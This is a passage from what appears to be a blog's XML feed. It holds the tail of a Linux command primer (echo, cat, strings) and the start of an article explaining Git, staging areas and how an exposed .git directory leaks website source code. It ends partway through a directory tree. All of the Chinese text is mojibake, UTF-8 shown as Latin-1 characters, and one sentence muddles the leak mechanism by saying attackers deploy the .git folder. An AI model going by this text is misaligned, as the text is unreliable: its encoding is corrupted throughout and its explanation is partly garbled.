å›è½¦<br></code></pre></td></tr></table></figure><p>ç„¶åæŒ‰aæˆ–iè¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œè¾“å…¥æƒ³è¦æ·»åŠ çš„æ–‡æœ¬ï¼Œç„¶åæŒ‰escé€€å‡ºç¼–è¾‘æ¨¡å¼ï¼Œè¾“å…¥:wqä¿å­˜å¹¶é€€å‡º</p><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><p>echoå‘½ä»¤åœ¨ç»ˆç«¯ä¸­æ˜¾ç¤ºå®šä¹‰çš„æ–‡æœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Cool message&quot;</span><br></code></pre></td></tr></table></figure><p>ç”¨echoæ–°å»ºæ–‡ä»¶ï¼Œè®²æ–‡æœ¬æ·»åŠ åˆ°æ–‡ä»¶ä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;This is a sample text&quot;</span> &gt;&gt; filename.txt<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨echoå‘½ä»¤æ‰“å°æ‰€æœ‰çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼ˆlså‘½ä»¤çš„æ›¿ä»£ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> *<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ä½¿ç”¨echoæ¥è¾“å‡ºæ–‡ä»¶å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(&lt;fileName)</span>&quot;</span><br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„å‘½ä»¤ä¸­ï¼Œâ€™&lt;â€™æ˜¯é‡å®šå‘ç¬¦ï¼Œç”¨äºæ”¹å˜æ ‡å‡†è¾“å…¥çš„æºï¼ˆä»é”®ç›˜æ”¹ä¸ºæ–‡ä»¶fileName)ï¼›&lt;fileNameå°†<br>fileNameæ–‡ä»¶è¾“å…¥åˆ°stdinä¸­ã€‚$(&lt;fileName)ç”¨äºè·å–stdinä¸­çš„æ•°æ®</p><p>å¦‚æœä¸€ä¸ªæ–‡ä»¶æ˜¯unicodeç¼–ç ï¼Œåˆ™åˆ©ç”¨ä¸‹é¢è¿™æ¡å‘½ä»¤ï¼Œå¯ä»¥è½¬åŒ–ä¸ºä¸­æ–‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-subst">$(&lt;fileName)</span>&quot;</span><br></code></pre></td></tr></table></figure><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><h3 id="è¯­æ³•-9"><a href="#è¯­æ³•-9" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> [é€‰é¡¹] [æ–‡ä»¶]<br></code></pre></td></tr></table></figure><h3 id="åŠŸèƒ½-9"><a href="#åŠŸèƒ½-9" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h3><p>æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„å†…å®¹</p><h3 id="å¸¸ç”¨é€‰é¡¹-7"><a href="#å¸¸ç”¨é€‰é¡¹-7" class="headerlink" title="å¸¸ç”¨é€‰é¡¹"></a>å¸¸ç”¨é€‰é¡¹</h3><ul><li>-b å¯¹éç©ºè¾“å‡ºè¡Œç¼–å·</li><li>-n å¯¹è¾“å‡ºçš„æ‰€æœ‰è¡Œç¼–å·</li><li>-s ä¸è¾“å‡ºå¤šè¡Œç©ºè¡Œ ä¸€èˆ¬ç›´æ¥ä½¿ç”¨</li></ul><h3 id="ä¸¾ä¾‹-6"><a href="#ä¸¾ä¾‹-6" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><p>ä¸€èˆ¬ç›´æ¥ä½¿ç”¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> text.txt<br></code></pre></td></tr></table></figure><p>catæŒ‡ä»¤ä¹Ÿå¯ä»¥ç¼–è¾‘æ–‡ä»¶æ–‡æœ¬ï¼ˆå¦‚æœæ²¡æœ‰è¯¥æ–‡ä»¶ä¼šç›´æ¥åˆ›å»ºï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt;&gt; test.txt<br></code></pre></td></tr></table></figure><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p>stringså‘½ä»¤åœ¨å¯¹è±¡æ–‡ä»¶æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æŸ¥æ‰¾å¯æ‰“å°çš„å­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²æ˜¯4ä¸ªæˆ–æ›´å¤šå¯æ‰“å°å­—ç¬¦çš„ä»»æ„åº åˆ—ï¼Œä»¥æ¢è¡Œç¬¦æˆ–ç©ºå­—ç¬¦ç»“æŸã€‚</p><h3 id="è¯­æ³•-10"><a href="#è¯­æ³•-10" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings [é€‰é¡¹] æ–‡ä»¶<br></code></pre></td></tr></table></figure><h3 id="å¸¸ç”¨é€‰é¡¹-éƒ¨åˆ†"><a href="#å¸¸ç”¨é€‰é¡¹-éƒ¨åˆ†" class="headerlink" title="å¸¸ç”¨é€‰é¡¹(éƒ¨åˆ†)"></a>å¸¸ç”¨é€‰é¡¹(éƒ¨åˆ†)</h3><ul><li>-a â€“allï¼šæ‰«ææ•´ä¸ªæ–‡ä»¶è€Œä¸æ˜¯åªæ‰«æç›®æ ‡æ–‡ä»¶åˆå§‹åŒ–å’Œè£…è½½æ®µ</li><li>-f â€“print-file-nameï¼šåœ¨æ˜¾ç¤ºå­—ç¬¦ä¸²å‰å…ˆæ˜¾ç¤ºæ–‡ä»¶å</li></ul><h3 id="ä¸¾ä¾‹-7"><a href="#ä¸¾ä¾‹-7" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">strings filenameæå–æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²<br>strings filename &gt; output.txtå°†è¾“å‡ºç»“æœå†™å…¥æ–‡ä»¶<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>å°çŸ¥è¯†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å°çŸ¥è¯†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gitå’ŒGitæ–‡ä»¶å¯¼è‡´æºç æ³„éœ²</title>
    <link href="/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/04/25/Git%E5%92%8CGit%E6%96%87%E4%BB%B6%E5%AF%BC%E8%87%B4%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<p>å‚è€ƒæ–‡ç« </p><blockquote><p>Gitæ–‡ä»¶æ³„éœ²æ¼æ´ï¼š<a href="https://blog.csdn.net/qq_45521281/article/details/105767428">https://blog.csdn.net/qq_45521281/article/details/105767428</a></p></blockquote><h1 id="ä»€ä¹ˆæ˜¯Git"><a href="#ä»€ä¹ˆæ˜¯Git" class="headerlink" title="ä»€ä¹ˆæ˜¯Git"></a>ä»€ä¹ˆæ˜¯Git</h1><p>Gitæ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å…ˆè¿›çš„å…è´¹å¼€æºåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå…¶è¯ç”Ÿä¸»è¦æ˜¯ä¸ºäº†é«˜æ•ˆç®¡ç†åƒ Linux å†…æ ¸è¿™ç§è§„æ¨¡çš„åºå¤§é¡¹ç›®</p><h2 id="ä»€ä¹ˆæ˜¯ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ"><a href="#ä»€ä¹ˆæ˜¯ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ"></a>ä»€ä¹ˆæ˜¯ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ</h2><p>ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼ˆVersion Control Systemï¼ŒVCSï¼‰æ˜¯ä¸€ç§åœ¨è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­ç”¨äºç®¡ç†æ–‡ä»¶å’Œé¡¹ç›®ç‰ˆæœ¬çš„å·¥å…·ï¼Œå¯ä»¥è®°å½•æ–‡ä»¶å†…å®¹çš„å˜åŒ–ï¼Œè®©ç”¨æˆ·æŸ¥çœ‹ç‰¹å®šç‰ˆæœ¬çš„æ–‡ä»¶å†…å®¹ï¼Œè¿˜èƒ½å†ä¸åŒç‰ˆæœ¬ä¹‹é—´è¿›è¡Œåˆ‡æ¢ï¼ŒåŒæ—¶ä¹Ÿæ–¹ä¾¿å›¢é˜Ÿæˆå‘˜åä½œå¼€å‘</p><p>ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿç±»å‹æœ‰ï¼šæœ¬åœ°ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ</p><h3 id="æœ¬åœ°ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ"><a href="#æœ¬åœ°ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ" class="headerlink" title="æœ¬åœ°ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ"></a>æœ¬åœ°ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ</h3><p>è¿™ç§ç³»ç»Ÿåªåœ¨æœ¬åœ°å¯¹æ–‡ä»¶çš„ä¸åŒç‰ˆæœ¬è¿›è¡Œç®¡ç†ã€‚å®ƒä¼šåœ¨æœ¬åœ°ä¿å­˜æ–‡ä»¶çš„å¤šä¸ªç‰ˆæœ¬ï¼Œé€šè¿‡ç®€å•çš„æ•°æ®åº“æ¥è®°å½•æ–‡ä»¶çš„æ›´æ–°ã€‚ä¾‹å¦‚ RCSï¼ˆRevision Control Systemï¼‰ï¼Œå®ƒåœ¨æœ¬åœ°ç£ç›˜ä¸Šä¿å­˜è¡¥ä¸é›†ï¼ˆæ–‡ä»¶ä¿®è®¢å‰åçš„å·®å¼‚ï¼‰ï¼Œé€šè¿‡åº”ç”¨è¿™äº›è¡¥ä¸é›†æ¥é‡ç°æ–‡ä»¶çš„å„ä¸ªç‰ˆæœ¬ã€‚</p><h3 id="é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ"><a href="#é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ" class="headerlink" title="é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ"></a>é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ</h3><p>è¯¥ç³»ç»Ÿæœ‰ä¸€ä¸ªé›†ä¸­ç®¡ç†çš„æœåŠ¡å™¨ï¼Œä¿å­˜æ‰€æœ‰æ–‡ä»¶çš„ä¿®è®¢ç‰ˆæœ¬ï¼Œè€ŒååŒå·¥ä½œçš„å¼€å‘è€…ä»¬çš„å®¢æˆ·ç«¯åˆ™ä»æœåŠ¡å™¨è·å–æœ€æ–°çš„æ–‡ä»¶æˆ–è€…æäº¤æ›´æ–°ã€‚SVNï¼ˆSubversionï¼‰å°±æ˜¯å…¸å‹çš„é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€‚å…¶ä¼˜ç‚¹æ˜¯æ–¹ä¾¿ç®¡ç†å‘˜å¯¹ç‰ˆæœ¬åº“è¿›è¡Œç®¡ç†ï¼Œç¼ºç‚¹æ˜¯ä¾èµ–ä¸­å¤®æœåŠ¡å™¨ï¼Œè‹¥æœåŠ¡å™¨å‡ºç°æ•…éšœï¼Œå›¢é˜Ÿæˆå‘˜å°±æ— æ³•æ­£å¸¸å·¥ä½œã€‚</p><h3 id="åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ"><a href="#åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ" class="headerlink" title="åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ"></a>åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ</h3><p>æ¯ä¸ªå¼€å‘è€…çš„æœ¬åœ°éƒ½æœ‰å®Œæ•´çš„ç‰ˆæœ¬åº“å‰¯æœ¬ï¼ŒåŒ…å«æ‰€æœ‰çš„å†å²ç‰ˆæœ¬ä¿¡æ¯ã€‚Git æ˜¯åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„ä»£è¡¨ã€‚åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå¼€å‘è€…å¯ä»¥åœ¨æœ¬åœ°è¿›è¡Œå„ç§ç‰ˆæœ¬æ§åˆ¶æ“ä½œï¼Œå¦‚æäº¤ã€åˆ›å»ºåˆ†æ”¯ç­‰ï¼Œä¸éœ€è¦ä¾èµ–ç½‘ç»œè¿æ¥åˆ°ä¸­å¤®æœåŠ¡å™¨ã€‚å›¢é˜Ÿæˆå‘˜ä¹‹é—´çš„åä½œå¯ä»¥é€šè¿‡æ¨é€å’Œæ‹‰å–æ“ä½œåœ¨ä¸åŒçš„æœ¬åœ°ä»“åº“ä¹‹é—´è¿›è¡Œã€‚</p><h2 id="ç‰ˆæœ¬åº“ã€å·¥ä½œåŒºå’Œæš‚å­˜åŒº"><a href="#ç‰ˆæœ¬åº“ã€å·¥ä½œåŒºå’Œæš‚å­˜åŒº" class="headerlink" title="ç‰ˆæœ¬åº“ã€å·¥ä½œåŒºå’Œæš‚å­˜åŒº"></a>ç‰ˆæœ¬åº“ã€å·¥ä½œåŒºå’Œæš‚å­˜åŒº</h2><h3 id="ç‰ˆæœ¬åº“"><a href="#ç‰ˆæœ¬åº“" class="headerlink" title="ç‰ˆæœ¬åº“"></a>ç‰ˆæœ¬åº“</h3><p>ç‰ˆæœ¬åº“ï¼ˆRepositoryï¼‰ï¼Œä¹Ÿè¢«ç§°ä½œä»“åº“ï¼Œæ˜¯ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„æ ¸å¿ƒç»„ä»¶ï¼Œç”¨äºå­˜å‚¨é¡¹ç›®çš„æ‰€æœ‰æ–‡ä»¶åŠå…¶å†å²ç‰ˆæœ¬ä¿¡æ¯ï¼Œé›†ä¸­å­˜å‚¨é¡¹ç›®æ‰€æœ‰æ–‡ä»¶ç‰ˆæœ¬ä¿¡æ¯çš„åœ°æ–¹ï¼Œç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¼šå¯¹æ–‡ä»¶çš„æ¯ä¸€æ¬¡ä¿®æ”¹è¿›è¡Œè®°å½•ï¼ŒåŒ…æ‹¬ä¿®æ”¹çš„å†…å®¹ã€æ—¶é—´ã€ä½œè€…ç­‰ï¼Œè¿™äº›ä¿¡æ¯éƒ½è¢«ä¿å­˜åœ¨ç‰ˆæœ¬åº“ä¸­ã€‚</p><p>ç‰ˆæœ¬åº“å¯ä»¥ç®€å•ç†è§£æˆä¸€ä¸ªç›®å½•ï¼Œè¿™ä¸ªç›®å½•é‡Œé¢çš„æ‰€æœ‰æ–‡ä»¶éƒ½å¯ä»¥è¢«Gitç®¡ç†èµ·æ¥ï¼Œæ¯ä¸ªæ–‡ä»¶çš„ä¿®æ”¹ã€åˆ é™¤ï¼ŒGitéƒ½èƒ½è·Ÿè¸ªï¼Œä»¥ä¾¿ä»»ä½•æ—¶åˆ»éƒ½å¯ä»¥è¿½è¸ªå†å²ï¼Œæˆ–è€…åœ¨å°†æ¥æŸä¸ªæ—¶åˆ»å¯ä»¥â€œè¿˜åŸâ€ã€‚</p><h4 id="æœ¬åœ°ç‰ˆæœ¬åº“"><a href="#æœ¬åœ°ç‰ˆæœ¬åº“" class="headerlink" title="æœ¬åœ°ç‰ˆæœ¬åº“"></a>æœ¬åœ°ç‰ˆæœ¬åº“</h4><p>å­˜åœ¨äºå¼€å‘è€…æœ¬åœ°è®¡ç®—æœºä¸­çš„ç‰ˆæœ¬åº“ã€‚å¼€å‘è€…å¯ä»¥åœ¨æœ¬åœ°å¯¹ç‰ˆæœ¬åº“è¿›è¡Œå„ç§æ“ä½œï¼Œå¦‚æäº¤ã€æŸ¥çœ‹å†å²è®°å½•ç­‰ï¼Œæ— éœ€ä¾èµ–ç½‘ç»œè¿æ¥ã€‚ä¾‹å¦‚ä½¿ç”¨ Git æ—¶ï¼Œåœ¨é¡¹ç›®ç›®å½•ä¸‹æ‰§è¡Œ<code>git init</code>å‘½ä»¤å°±ä¼šåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªç‰ˆæœ¬åº“ã€‚</p><h4 id="è¿œç¨‹ç‰ˆæœ¬åº“"><a href="#è¿œç¨‹ç‰ˆæœ¬åº“" class="headerlink" title="è¿œç¨‹ç‰ˆæœ¬åº“"></a>è¿œç¨‹ç‰ˆæœ¬åº“</h4><p>å­˜å‚¨åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„ç‰ˆæœ¬åº“ï¼Œé€šå¸¸ç”¨äºå›¢é˜Ÿåä½œå¼€å‘ã€‚å›¢é˜Ÿæˆå‘˜å¯ä»¥ä»è¿œç¨‹ç‰ˆæœ¬åº“å…‹éš†é¡¹ç›®åˆ°æœ¬åœ°ï¼Œè¿›è¡Œå¼€å‘åå†å°†æœ¬åœ°çš„ä¿®æ”¹æ¨é€åˆ°è¿œç¨‹ç‰ˆæœ¬åº“ï¼Œä¸å…¶ä»–æˆå‘˜å…±äº«ã€‚åƒ GitHubã€GitLab ç­‰å¹³å°æä¾›çš„å°±æ˜¯è¿œç¨‹ç‰ˆæœ¬åº“æœåŠ¡ã€‚</p><h3 id="å·¥ä½œåŒº"><a href="#å·¥ä½œåŒº" class="headerlink" title="å·¥ä½œåŒº"></a>å·¥ä½œåŒº</h3><p>å·¥ä½œåŒºæŒ‡çš„æ˜¯ä½ åœ¨æœ¬åœ°è®¡ç®—æœºé‡Œå®é™…æ“ä½œçš„é¡¹ç›®ç›®å½•ï¼Œå°±æ˜¯ä½ èƒ½å¤Ÿçœ‹åˆ°å¹¶è¿›è¡Œæ–‡ä»¶ç¼–è¾‘ã€åˆ›å»ºã€åˆ é™¤ç­‰æ“ä½œçš„æ–‡ä»¶å¤¹ï¼Œç®€å•çš„è¯´å°±æ˜¯ç”µè„‘ä¸­çœ‹åˆ°çš„ç›®å½•ã€‚</p><p>åœ¨å·¥ä½œåŒºï¼Œä½ èƒ½è‡ªç”±ä¿®æ”¹æ–‡ä»¶å†…å®¹ï¼Œå®ƒç‹¬ç«‹äºç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†ã€‚ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿä¸€å¼€å§‹å¹¶ä¸ä¼šè‡ªåŠ¨è·Ÿè¸ªä½ åœ¨å·¥ä½œåŒºçš„ä¿®æ”¹ï¼Œåªæœ‰å½“ä½ æ‰§è¡Œç‰¹å®šæ“ä½œæ—¶ï¼Œè¿™äº›ä¿®æ”¹æ‰ä¼šè¢«çº³å…¥ç‰ˆæœ¬æ§åˆ¶æµç¨‹ã€‚</p><p>å‡è®¾ä½ ä½¿ç”¨ Git ç®¡ç†ä¸€ä¸ªåä¸º<code>my_project</code>çš„é¡¹ç›®ï¼Œåœ¨æœ¬åœ°ç£ç›˜ä¸Šçš„<code>C:\Users\Username\my_project</code>ç›®å½•å°±æ˜¯å·¥ä½œåŒºã€‚ä½ å¯ä»¥åœ¨è¿™ä¸ªç›®å½•ä¸‹ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼Œæˆ–è€…åˆ›å»ºæ–°æ–‡ä»¶ã€‚</p><h3 id="æš‚å­˜åŒº"><a href="#æš‚å­˜åŒº" class="headerlink" title="æš‚å­˜åŒº"></a>æš‚å­˜åŒº</h3><p>æš‚å­˜åŒºä¹Ÿè¢«å«åšç´¢å¼•ï¼ˆindexï¼‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸­é—´åŒºåŸŸï¼Œç”¨äºå‡†å¤‡è¦æäº¤åˆ°æœ¬åœ°ä»“åº“çš„æ–‡ä»¶ä¿®æ”¹ã€‚å½“ä½ å¯¹å·¥ä½œåŒºçš„æ–‡ä»¶è¿›è¡Œä¿®æ”¹åï¼Œå¯é€‰æ‹©å°†éƒ¨åˆ†æˆ–å…¨éƒ¨ä¿®æ”¹æ·»åŠ åˆ°æš‚å­˜åŒºã€‚</p><p>æš‚å­˜åŒºå†ç‰ˆæœ¬åº“é‡Œï¼Œç‰ˆæœ¬åº“å°±æ˜¯éšè—ç›®å½• <code>.git</code></p><p>åˆ†æ”¯åœ¨å®é™…ä¸­æœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå‡è®¾ä½ å‡†å¤‡å¼€å‘ä¸€ä¸ªæ–°åŠŸèƒ½ï¼Œä½†æ˜¯éœ€è¦ä¸¤å‘¨æ‰èƒ½å®Œæˆï¼Œç¬¬ä¸€å‘¨ä½ å†™äº†50%çš„ä»£ç ï¼Œå¦‚æœç«‹åˆ»æäº¤ï¼Œç”±äºä»£ç è¿˜æ²¡å†™å®Œï¼Œä¸å®Œæ•´çš„ä»£ç åº“ä¼šå¯¼è‡´åˆ«äººä¸èƒ½å¹²æ´»äº†ã€‚å¦‚æœç­‰ä»£ç å…¨éƒ¨å†™å®Œå†ä¸€æ¬¡æäº¤ï¼Œåˆå­˜åœ¨ä¸¢å¤±æ¯å¤©è¿›åº¦çš„å·¨å¤§é£é™©ã€‚</p><p>ç°åœ¨æœ‰äº†åˆ†æ”¯ï¼Œå°±ä¸ç”¨æ€•äº†ã€‚ä½ åˆ›å»ºäº†ä¸€ä¸ªå±äºä½ è‡ªå·±çš„åˆ†æ”¯ï¼Œåˆ«äººçœ‹ä¸åˆ°ï¼Œè¿˜ç»§ç»­åœ¨åŸæ¥çš„åˆ†æ”¯ä¸Šæ­£å¸¸å·¥ä½œï¼Œè€Œä½ åœ¨è‡ªå·±çš„åˆ†æ”¯ä¸Šå¹²æ´»ï¼Œæƒ³æäº¤å°±æäº¤ï¼Œç›´åˆ°å¼€å‘å®Œæ¯•åï¼Œå†ä¸€æ¬¡æ€§åˆå¹¶åˆ°åŸæ¥çš„åˆ†æ”¯ä¸Šï¼Œè¿™æ ·ï¼Œæ—¢å®‰å…¨ï¼Œåˆä¸å½±å“åˆ«äººå·¥ä½œã€‚</p><h1 id="gitæ–‡ä»¶å¯¼è‡´çš„æºç æ³„éœ²"><a href="#gitæ–‡ä»¶å¯¼è‡´çš„æºç æ³„éœ²" class="headerlink" title=".gitæ–‡ä»¶å¯¼è‡´çš„æºç æ³„éœ²"></a>.gitæ–‡ä»¶å¯¼è‡´çš„æºç æ³„éœ²</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>å¼€å‘äººå‘˜å†å¼€å‘æ—¶ï¼Œå¸¸å¸¸ä¼šå…ˆæŠŠæºç æäº¤åˆ°è¿œç¨‹æ‰˜ç®¡ç½‘ç«™ï¼ˆå¦‚ï¼š<code>github</code>ï¼‰ï¼Œæœ€åå†ä»è¿œç¨‹æ‰˜ç®¡ç½‘ç«™æŠŠæºç pullåˆ°æœåŠ¡å™¨çš„webç›®å½•ä¸‹ï¼Œå¦‚æœå¿˜è®°åˆ é™¤<code>.git</code>æ–‡ä»¶ï¼Œå°±ä¼šå¯¼è‡´æºç æ³„éœ²ï¼Œæ”»å‡»è€…å°±å¯èƒ½ä¼šå°†<code>.git</code>æ–‡ä»¶å¤¹ç›´æ¥éƒ¨ç½²åˆ°çº¿ä¸Šç¯å¢ƒï¼Œè¿™å°±å¼•èµ·äº†gitæ³„éœ²æ¼æ´</p><h3 id="gitçš„ç›®å½•ç»“æ„"><a href="#gitçš„ç›®å½•ç»“æ„" class="headerlink" title="gitçš„ç›®å½•ç»“æ„"></a>gitçš„ç›®å½•ç»“æ„</h3><p>åœ¨ä¸€ä¸ªç›®å½•ä¸­åˆå§‹åŒ–ä¸€ä¸ªä»“åº“ä»¥åï¼Œ<code>Git</code>ä¼šåœ¨è¯¥ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º<code>.git</code>çš„éšè—ç›®å½•ï¼ˆç‰ˆæœ¬åº“ï¼‰ï¼Œè¿™ä¸ªç›®å½•ä¸­åŒ…å«äº†<code>Git</code>ä»“åº“çš„æ‰€æœ‰å…ƒæ•°æ®å’Œå¯¹è±¡æ•°æ®åº“ï¼ˆå°±æ˜¯è¿™ä¸ªä»“åº“çš„æ‰€æœ‰ç‰ˆæœ¬ç­‰ä¸€ç³»åˆ—ä¿¡æ¯ï¼‰ï¼Œå¦‚ä¸‹</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs nix">.git<span class="hljs-symbol">/</span><br>â”œâ”€â”€ branches<span class="hljs-symbol">/</span>         <span class="hljs-comment"># æ—§çš„åˆ†æ”¯å¼•ç”¨ç›®å½•ï¼Œç°åœ¨åŸºæœ¬ä¸å†ä½¿ç”¨</span><br>â”œâ”€â”€ config            <span class="hljs-comment"># ä»“åº“çš„é…ç½®æ–‡ä»¶ï¼ŒåŒ…å«ä»“åº“çº§åˆ«çš„é…ç½®ä¿¡æ¯</span><br>â”œâ”€â”€ description       <span class="hljs-comment"># ä»“åº“çš„æè¿°ä¿¡æ¯ï¼Œä¸»è¦ä¾›GitWebç­‰å·¥å…·ä½¿ç”¨</span><br>â”œâ”€â”€ HEAD              <span class="hljs-comment"># æŒ‡å‘å½“å‰æ‰€åœ¨åˆ†æ”¯çš„å¼•ç”¨</span><br>â”œâ”€â”€ hooks<span class="hljs-symbol">/</span>            <span class="hljs-comment"># å­˜æ”¾é’©å­è„šæœ¬çš„ç›®å½•ï¼Œç”¨äºåœ¨ç‰¹å®šçš„Gitæ“ä½œå‰åæ‰§è¡Œè‡ªå®šä¹‰è„šæœ¬</span><br>â”œâ”€â”€ info<span class="hljs-symbol">/</span>             <span class="hljs-comment"># åŒ…å«ä¸€äº›ä»“åº“çš„é¢å¤–ä¿¡æ¯</span><br>â”‚   â””â”€â”€ exclude       <span class="hljs-comment"># æœ¬åœ°çš„å¿½ç•¥æ–‡ä»¶ï¼Œä½œç”¨ç±»ä¼¼äº .gitignore</span><br>â”œâ”€â”€ objects<span class="hljs-symbol">/</span>          <span class="hljs-comment"># å­˜å‚¨æ‰€æœ‰å¯¹è±¡æ•°æ®çš„ç›®å½•ï¼Œå¦‚æäº¤å¯¹è±¡ã€æ ‘å¯¹è±¡ã€Blobå¯¹è±¡ç­‰</span><br>â”‚   â”œâ”€â”€ info<span class="hljs-symbol">/</span><br>â”‚   â””â”€â”€ pack<span class="hljs-symbol">/</span><br>â”œâ”€â”€ refs<span class="hljs-symbol">/</span>             <span class="hljs-comment"># å­˜å‚¨å¼•ç”¨çš„ç›®å½•ï¼Œå¦‚åˆ†æ”¯ã€æ ‡ç­¾ç­‰</span><br>â”‚   â”œâ”€â”€ heads<span class="hljs-symbol">/</span>        <span class="hljs-comment"># å­˜å‚¨æœ¬åœ°åˆ†æ”¯çš„å¼•ç”¨</span><br>â”‚   â”œâ”€â”€ tags<span class="hljs-symbol">/</span>         <span class="hljs-comment"># å­˜å‚¨æ ‡ç­¾çš„å¼•ç”¨</span><br>â”‚   â””â”€â”€ remotes<span class="hljs-symbol">/</span>      <span class="hljs-comment"># å­˜å‚¨è¿œç¨‹åˆ†æ”¯çš„å¼•ç”¨</span><br>â””â”€â”€ index             <span class="hljs-comment"># 